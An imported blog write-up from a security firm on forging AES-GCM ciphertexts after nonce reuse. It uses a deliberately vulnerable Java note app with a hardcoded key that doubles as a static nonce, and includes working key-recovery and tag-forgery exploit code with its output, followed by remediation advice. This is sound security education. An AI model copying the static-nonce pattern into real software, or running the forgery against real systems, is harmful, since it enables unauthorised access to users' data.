---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-09-25_attacks-on-gcm-with-repeated-nonces.md
original_filename: 2020-09-25_attacks-on-gcm-with-repeated-nonces.md
title: Attacks On GCM With Repeated Nonces
category: documents
detected_topics:
- sso
- idor
- xss
- sqli
- command-injection
- otp
tags:
- imported
- documents
- sso
- idor
- xss
- sqli
- command-injection
- otp
language: en
raw_sha256: 7b1be766168c774adb56eac4ac50e09e8151330f0b55f08e4919b21f3333d04c
text_sha256: 80872365c9ab0e964f4e0175a97d0532bd2158eb5ccbff3435b722502399a159
ingested_at: '2026-06-28T07:32:03Z'
sensitivity: unknown
redactions_applied: true
---

# Attacks On GCM With Repeated Nonces

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-09-25_attacks-on-gcm-with-repeated-nonces.md
- Source Type: markdown
- Detected Topics: sso, idor, xss, sqli, command-injection, otp
- Ingested At: 2026-06-28T07:32:03Z
- Redactions Applied: True
- Raw SHA256: `7b1be766168c774adb56eac4ac50e09e8151330f0b55f08e4919b21f3333d04c`
- Text SHA256: `80872365c9ab0e964f4e0175a97d0532bd2158eb5ccbff3435b722502399a159`


## Content

---
title: "Attacks On GCM With Repeated Nonces"
page_title: "Attacks on GCM with Repeated Nonces - elttam"
url: "https://www.elttam.com/blog/key-recovery-attacks-on-gcm/"
final_url: "https://www.elttam.com/blog/key-recovery-attacks-on-gcm"
authors: ["Sebastien Macke"]
bugs: ["Cryptographic issues", "Security code review"]
publication_date: "2020-09-25"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4238
---

[Skip to main content](/#main)

Important Update Banner

Close Announcement Banner

[](/)

  * [What We Do](/what-we-do)
  * [How We Work](/how-we-work)
  * [RESOURCES](/resources)
  * [About Us](/about-us)

  * [](/contact)

Contact Us

CONTACT US

[](/)

  * [What We Do](/what-we-do)
  * [How We Work](/how-we-work)
  * [RESOURCES](/resources)
  * [About Us](/about-us)

  * [](/contact)

Contact Us

CONTACT US

By

Sebastien Macke

September 25, 2020

# Attacks on GCM with Repeated Nonces

PoC or it didn't happen

crypto

web

On This Page

TOC Element

Share:

## Overview

Cryptography is a cornerstone of information security, with implementations running in various places to secure our Internet communications.Quite often web applications also need to use cryptography directly to protect sensitive features or data.Unfortunately quite often also usage errors are made, which can have disastrous security consequences.

This post focuses on [AES-GCM](https://en.wikipedia.org/wiki/Galois/Counter_Mode) and the security impact of using the same IV (nonce) to encrypt data to the users of a web application, based on an issue we identified and exploited on a recent white-box assessment.

The authentication assurance in GCM crucially depends on using a unique nonce for every encryption performed with the same key.The importance of this requirement is thoroughly documented in the [specification](https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38d.pdf).

Failure to comply makes the application vulnerable to forgery attacks whereby an adversary can forge any ciphertext with a valid signature.The purpose of this blog post is to demonstrate this attack in practice with an actual exploit.

## Playing at home

I wrote a simple [webapp](https://github.com/elttam/sparkdemo) in Java to showcase the attack.It will run in Docker with `./run.sh docker`.

Users can save personal notes via the `POST /note` endpoint and retrieve them via the `GET /note/:id` endpoint.No authentication is required, sort of like a basic pastebin.
  
  
  $ curl http://127.0.0.1:4567/note -d 'root pw is Bl@ckToW3r'
  {'href':'/note/a4a03583db964d0bb820e9f1b19ace801109870262540849fead69892104c4f4371dc94c535b4ba2','text':'root pw is Bl@ckToW3r'}
  $ curl http://127.0.0.1:4567/note/a4a03583db964d0bb820e9f1b19ace8011098702***REDACTED-SUSPECT-TOKEN***  {'href':'/note/a4a03583db964d0bb820e9f1b19ace801109870262540849fead69892104c4f4371dc94c535b4ba2','text':'root pw is Bl@ckToW3r'}

Instead of generating a random UUID back to the user, the app encrypts the sequential note ID with AES-GCM.
  
  
  public Note saveNote(String text) {
  if (counter >= Integer.MAX_VALUE) {
  throw new RuntimeException('db is full');
  }
  counter += 1;
  
  String note_id = format('IDv1-%010d-Internal', counter); // Integer.MAX_VALUE is 10 digits long
  String href = '/note/' + crypto.encrypt(note_id);
  ...

Without authenticated encryption, an adversary could easily access everyone else’s notes by trying different IDs.

After saving a couple of notes, the signature part quickly stands out as being the last 16 bytes (aka the authentication tag), while almost all of the encrypted part remains the same except one byte that changes each time.

![IDs diff colored](https://cdn.prod.website-files.com/6971f0e051b588235e8acf7b/69c28aa777548b0b7ba00977_69b9894b98d4689aa9c862f6_ids-colored-diff.avif)

If we try to query a different ID by altering one byte in the last ciphertext (from `0xc5` to `0xc6` for example), the appplication safely rejects it because the signature does not match.
  
  
  $ curl http://127.0.0.1:4567/note/a4a03583db964d0bb820e9f1b19ac68011098702***REDACTED-SUSPECT-TOKEN***  {'message':'javax.crypto.AEADBadTagException: Tag mismatch!'}

Even though the encrypted data seems to follow some kind of sequence, the authentication mechanim in GCM effectively defeats enumeration attacks.

## The vuln

The vulnerability can be spotted in the `com.example.sparkdemo.Crypto` class which encrypts and decrypts the note IDs.The nonce is set to the 16-byte AES key, which remains static throughout execution.However in other real-world cases, we might find the nonce fixed to some arbitrary value.
  
  
  public class Crypto {
  
  private Key key;
  private GCMParameterSpec gcmParameterSpec;
  
  public Crypto() {
  byte[] keyBytes = 'YELLOW_SUBMARINE'.getBytes();
  key = new SecretKeySpec(keyBytes, 'AES');
  gcmParameterSpec = new GCMParameterSpec(128, keyBytes);
  }
  
  private synchronized byte[] transform(byte[] data, int mode) {
  try {
  Cipher cipher = Cipher.getInstance('AES/GCM/NoPadding');
  cipher.init(mode, key, gcmParameterSpec);
  return cipher.doFinal(data);
  } catch (GeneralSecurityException ex) {
  throw new RuntimeException(ex);
  }
  }
  
  public String encrypt(String data) {
  return DatatypeConverter.printHexBinary(transform(data.getBytes(), Cipher.ENCRYPT_MODE)).toLowerCase();
  }

The `GCMParameterSpec` parameter specifies the size of the authentication tag (128 bits is the spec’s recommended size), and a nonce value, which should be different for each encryption call.So for instance if an application starts with a nonce of `0x0000..00`, the next call to `encrypt()` should use `0x0000..01` etc.

## GCM 101

A plaintext encrypted with GCM produces a ciphertext that is the concatenation of the encrypted plaintext and the authentication tag.The plaintext is encrypted with the CTR mode of operation, while the tag is computed with the Galois hash function.

Therefore encrypting 3 bytes of plaintext such as “abc” will produce 3 bytes of encrypted text with a 16-byte tag.
  
  
  +--------------+
  |  616263  |
  +--------------+
  |
  v
  +----------------------------+
  | Key = 'YELLLOW_SUBMARINE'  |
  | Iv  = '\x00'*12  |*
  |---------+  +--------------|
  |  CTR  |  |  GHASH  |
  +----------------------------+
  |  |
  v  v
  +--------------------------------------------+
  | e7660e || 48097e709e410bebbce1bf4e9ab13405 |
  +--------------------------------------------+

For a more detailed overview of GCM I found this short educational [video](https://youtu.be/g_eY7JXOc8U) to be quite good.

## The impact

Using a static nonce is a well known security pitfall for any stream cipher.This includes RC4 or any block cipher such as AES run in CTR mode.

  1. First of all, XORing two different ciphertexts will reveal the XOR of the corresponding plaintexts, exposing the static and dynamic bits.
  2. An adversary could also recover the plaintexts through statistical analysis (e.g. using English character frequency, ngrams etc.) provided that enough ciphertexts of diverse plaintexts can be obtained.This is actually an [exercise](https://cryptopals.com/sets/3/challenges/20) featured in the Cryptopals challenge series, and a Python implementation of this attack is on [my github](https://github.com/lanjelot/cryptopal).
  3. Lastly, collecting two different messages encrypted with the same nonce allows an adversary to immediately recover the secret authentication key.This attack is also featured in Cryptopals in challenge [#63](https://cryptopals.com/sets/8).

The authentication key, which is derived from the AES key, is used in the computation of the authentication tag.Although its compromise will not leak the cipher key, it allows an adversary to conduct ciphertext forgery attacks.

## The maths

The attack was first described by Antoine Joux, courtesy of the French Government Defense agency, and his [paper](https://csrc.nist.gov/csrc/media/projects/block-cipher-techniques/documents/bcm/comments/800-38-series-drafts/gcm/joux_comments.pdf) is a must read bien sûr.

But raw maths can be off-putting and a gentler way in for a non-mathematician like me was the Cryptopals challenge’s [description/walk-through](https://toadstyle.org/cryptopals/63.txt).The key points are easy to understand and the abstract algebra is more accessible to grasp.

Note that the descriptions for Cryptopals Set 8 are not hosted on [cryptopals.com](https://cryptopals.com/) because these were written after [@tqbf](https://twitter.com/tqbf) and [@spdevlin](https://twitter.com/spdevlin) had both left NCC which own the domain.

Public solutions for this last batch of challenges are scarce because they are “really tough”! But a Java implementation can be found on [github](https://github.com/ilchen/cryptopals#challenge-63-key-recovery-attacks-on-gcm-with-repeated-nonces) which is well documented and gives valuable insight on the various code blocks required to assemble a working exploit.

This wonderful gift from the gods works fine and will recover the authentication key, however it will only let us forge the [associated data (AD)](https://en.wikipedia.org/wiki/Authenticated_encryption#Authenticated_encryption_with_associated_data_\(AEAD\)), not the ciphertext part.Since this capability is required to pwn our vulnerable demo, and likely to be handy in real-world situations, the original code needed some [adjustments](https://github.com/elttam/cryptopals).

## The exploit

The `forgeCipherText()` function was updated to let us forge a chosen ciphertext instead of associated data.The legit ciphertext and the recovered authentication key both come in the computation of the forged tag.
  
  
  public static String forgeCipherText(byte[] legitCipherText, byte[] chosenCipherText,
  PolynomialGaloisFieldOverGF2.FieldElement authenticationKey)
  {
  byte[] legitCtxt = Arrays.copyOfRange(legitCipherText, 0, legitCipherText.length - BLOCK_SIZE);
  byte[] legitTag = Arrays.copyOfRange(legitCipherText, legitCipherText.length - BLOCK_SIZE, legitCipherText.length);
  
  // We start with the original legit tag...
  PolynomialGaloisFieldOverGF2.FieldElement forgedTag = toFE(legitTag);
  int numBlocks = legitCtxt.length / BLOCK_SIZE + 1;
  
  for (int i = 0, power = numBlocks + 1; i < numBlocks; i++, power--) {
  // subtract the c blocks (c0, c1 ...)
  forgedTag = forgedTag.subtract(
  toFE( Arrays.copyOfRange(legitCtxt, i * BLOCK_SIZE, (i + 1) * BLOCK_SIZE) )
  .multiply(authenticationKey.scale(valueOf(power))) );
  
  // add the c' blocks (c'0, c'1 ...)
  forgedTag = forgedTag.add(
  toFE( Arrays.copyOfRange(chosenCipherText, i * BLOCK_SIZE, (i + 1) * BLOCK_SIZE) )
  .multiply(authenticationKey.scale(valueOf(power))) );
  }
  
  return DatatypeConverter.printHexBinary(chosenCipherText) + DatatypeConverter.printHexBinary(forgedTag.asArray());
  }

A new `com.cryptopals.Exploit` helper class was created to be the `main()` entry point of our exploit program.The `revoverKeys()` and `forgeTag()` functions are then called from `main()` based on how many arguments are passed on the command line.

The `exploit.sh` script simply runs maven to compile and execute `Exploit.main()`.

## Demo time

First we run the exploit with two captured ciphertexts in an attempt to recover the authentication key.
  
  
  $ ./exploit.sh a4a03583db964d0bb820e9f1b19ace801109870262540849fead69892104c4f4371dc94c535b4ba2 a4a03583db964d0bb820e9f1b19acf8011098702***REDACTED-SUSPECT-TOKEN***  [+] Pretty printing
  cTxt1: A4A03583DB964D0BB820E9F1B19ACE80 11098702625408490000000000000000 ***REDACTED-SUSPECT-TOKEN***  cTxt2: A4A03583DB964D0BB820E9F1B19ACF80 11098702625408490000000000000000 ***REDACTED-SUSPECT-TOKEN***  XORed: 00000000000000000000000000000100 00000000000000000000000000000000 ***REDACTED-SUSPECT-TOKEN***  [+] Recovering candidate authentication keys
  cTxt1 polynomial: 173598d8f97041dd0b269dbc1ac0525x^3 + 92102a4640e19088x^2 + 3000000000000000000000000000000x + ***REDACTED-SUSPECT-TOKEN***  cTxt2 polynomial: 1f3598d8f97041dd0b269dbc1ac0525x^3 + 92102a4640e19088x^2 + 3000000000000000000000000000000x + ***REDACTED-SUSPECT-TOKEN***  Equation: x^3 + ***REDACTED-SUSPECT-TOKEN***  Candidates found after square-free and distinct-degree factorization: []
  Additional candidates found after equal-degree factorization: [x + 36ffd253b63bc6b18c6f0300f3f0b98e, x + 49b479b3c110ede2828eb95659d6ef6e, x + 7f4babe0772b2b530ee1ba56aa2656e0]
  -> Recovered candidates: 36ffd253b63bc6b18c6f0300f3f0b98e, 49b479b3c110ede2828eb95659d6ef6e, ***REDACTED-SUSPECT-TOKEN***The ciphertexts are split into 16-byte blocks then XORed together to highlight their differences.Then their respective polynomial representations are calculated and XORed together to produce an equation with the authentication key as a root.Finally the key is recovered through three factorization algorithms.

The factorizations may produce more than one candidate for the authentication key, in which case we can either:

  * factorize more messages until we can isolate one common candidate
  * or simply forge our chosen ciphertext with each candidate and find out which works

Since we noticed that one byte was changing from `0xce` to `0xcf` in our first two ciphertexts, let’s choose `0xcd` for our forged ciphertext.We run the exploit again with our desired ciphertext as the third argument.
  
  
  $ ./exploit.sh a4a03583db964d0bb820e9f1b19ace801109870262540849fead69892104c4f4371dc94c535b4ba2 \
  a4a03583db964d0bb820e9f1b19acf801109870262540849058231608a98a7c64f9f854408a3ac67 \
  A4A03583***REDACTED-SUSPECT-TOKEN***  [+] Forging ciphertext A4A03583***REDACTED-SUSPECT-TOKEN***  -> Using authentication key: ***REDACTED-SUSPECT-TOKEN***  Legit  cipher text: a4a03583db964d0bb820e9f1b19ace801109870262540849fead69892104c4f4371dc94c535b4ba2 = A4A03583DB964D0BB820E9F1B19ACE80 11098702625408490000000000000000 ***REDACTED-SUSPECT-TOKEN***  Forged cipher text: A4A03583DB964D0BB820E9F1B19ACD80110987026254084931DC80B3DDA061A2BE9B1D54BF5263EC = A4A03583DB964D0BB820E9F1B19ACD80 11098702625408490000000000000000 ***REDACTED-SUSPECT-TOKEN***  -> Using authentication key: ***REDACTED-SUSPECT-TOKEN***  Forged tag is identical, skipping duplicate
  -> Using authentication key: ***REDACTED-SUSPECT-TOKEN***  Forged tag is identical, skipping duplicate

All three key candidates produced the same tag.Let’s find out whether the app accepts it as valid.
  
  
  $ curl http://127.0.0.1:4567/note/A4A03583DB964D0BB820E9F1B19ACD8011098702***REDACTED-SUSPECT-TOKEN***  {'href':'/note/a4a03583db964d0bb820e9f1b19acd80110987026254084931dc80b3dda061a2be9b1d54bf5263ec','text':'fl4g{th3-br0wn-f0x-|s-r4d}'}

Success - we retrieved someone else’s note!

## Remediation

Preferably the app would send random UUIDs to the users and maintain a lookup table to the corresponding legacy note IDs.But the stateless aspect of authenticated encryption is just too convenient to pass on.

However unless unique nonces can be guaranteed, AES-GCM should be traded out.One option would be to switch to a nonce misuse resistant mode such as [AES-GCM-SIV](https://en.wikipedia.org/wiki/AES-GCM-SIV), but the handful of implementations available may still need some maturing.

Otherwise AES-CBC with HMAC-SHA would be a solid contender, as long as the associated security requirements are properly implemented.Examples of which include using:

  * the Encrypt-then-MAC method
  * distinct keys (for encryption and the keyed hash)
  * constant time comparison of the MAC
  * never set IV=KEY or the encryption key can be [leaked](https://defuse.ca/blog/recovering-cbc-mode-iv-chosen-ciphertext.html)

Although CBC-SHA was superseded by GCM in TLS for performance reasons, the speed difference may be negligible in our webapp considering the messages are only a couple of blocks long.

## Final thoughts

One take away would be that although having the source code gives an advantage, it is not essential to identify and exploit a nonce reuse issue in a black-box setup.

Also worth mentioning that there are other interesting places where GCM is implemented, including SSH, TLS and IPsec.And there are other compelling attacks on GCM and its modern real-world crypto cousins.Surveying popular implementations may open to fun research projects.

Finally I highly recommend working through the [Cryptopals](https://cryptopals.com/) series to learn about real-world crypto and the most common mistakes to look for during engagements (and CTFs :)

Merci for reading!

[Exploiting Auth0 Defaults in XSS Attacks](/blog/exploiting-auth0-defaults-in-xss-attacks)

[Jupyter Enterprise Gateway](/blog/jupyter-enterprise-gateway)

[Golang code review notes II](/blog/golang-code-review-notes-ii)

[ORM Leaking More Than You Joined For](/blog/leaking-more-than-you-joined-for)

[Gotchas in Email Parsing - Lessons From Jakarta Mail](/blog/jakarta-mail-primitives)

[New Method to Leverage Unsafe Reflection and Deserialisation to RCE on Rails](/blog/rails-sqlite-gadget-rce)

[A Monocle on Chronicles](/blog/monocle-on-chronicles)

[DUCTF 2024 ESPecially Secure Boot Writeup](/blog/ductf24-especially-secure-boot)

[plORMbing your Prisma ORM with Time-based Attacks](/blog/plorming-your-primsa-orm)

[plORMbing your Django ORM](/blog/plormbing-your-django-orm)

[Keeping up with the Pwnses](/blog/talkback-intro)

[Exploring the STSAFE-A110](/blog/stsafe-a110)

[RE of LR3](/blog/re-of-lr3)

[Abusing Amazon VPC CNI plugin for Kubernetes](/blog/amazon-vpc-cni)

[PwnAssistant - Controlling /home's via a Home Assistant RCE](/blog/pwnassistant)

[Cracking the Odd Case of Randomness in Java](/blog/cracking-randomness-in-java)

[Golang code review notes](/blog/golang-codereview)

[ESP-IDF setup guide](/blog/esp-idf-setup-guide)

[Tuya IoT and EZ Mode Pairing](/blog/ez-mode-pairing)

[Attacks on GCM with Repeated Nonces](/blog/key-recovery-attacks-on-gcm)

[Simple Bugs With Complex Exploits](/blog/simple-bugs-with-complex-exploits)

[Lua SUID Shells](/blog/lua-suid-shells)

[Hacking with Environment Variables](/blog/env)

[Are you winning if you're pinning?](/blog/certpinning)

[Ruby 2.x Universal RCE Deserialization Gadget Chain](/blog/ruby-deserialization)

[Fuze Multi-Card Technology Security Review](/blog/fuzereview)

[Remote LD_PRELOAD Exploitation](/blog/goahead)

[Building Hardened Docker Images from Scratch with Kubler](/blog/kubler)

[Intro to SDR and RF Signal Analysis](/blog/intro-sdr-and-rf-analysis)

[Playing with canaries](/blog/playing-with-canaries)

[EFF secure messaging scorecard review](/blog/a-review-of-the-eff-secure-messaging-scorecard-pt2)

[Vuln research on the WAG54G home router](/blog/vuln-research-on-the-wag54g-home-router)

[A review of the EFF secure messaging scorecard...](/blog/a-review-of-the-eff-secure-messaging-scorecard-pt1)

[Gaining console access to the WAG54G home router](/blog/gaining-console-access-to-the-wag54g-home-router)

[Why I recommend Chrome to family...](/blog/why-i-recommend-chrome)

[hello@elttam.com](mailto:hello@elttam.com)

Key: [87169502a105dcb5](https://keyserver.ubuntu.com/pks/lookup?op=get&search=0x7dd2580f50ab3231873fefa887169502a105dcb5)

Suite 343  
3 Albert Coates Ln  
Melbourne, VIC, 3000

[What We Do](/what-we-do)

[Blog](/resources)

[How We Work](/how-we-work)

[About Us](/about-us)

© {{year}} elttam Security Pty Ltd. ABN 54 684 907 702

[](https://bsky.app/profile/elttam.bsky.social)

[](https://x.com/elttam)

[](https://www.linkedin.com/company/elttam/)

[](https://github.com/elttam)

[](/blog/rss.xml)
